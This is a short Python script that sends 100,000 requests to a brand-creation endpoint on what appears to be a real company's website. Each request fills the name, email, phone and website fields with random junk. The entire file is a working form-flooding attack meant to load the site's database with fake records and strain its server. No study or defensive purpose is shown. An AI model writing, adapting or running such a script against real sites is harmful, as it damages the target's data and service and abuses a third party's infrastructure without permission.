import requests
import random
import string

def randomGen():
    return ''.join((random.choice(string.ascii_lowercase) for x in range(random.randint(10,1000))))
done = 1
for x in range(100000):
    result = requests.get(f'https://getsetflymedia.in/createbrand.php?brand_name={randomGen()}&brand_email={randomGen()}%40gmail.com&brand_phone={"".join([str(random.randint(0,9)) for i in range(10)])}&brand_website={randomGen()}')
    print(done,result)
    done += 1
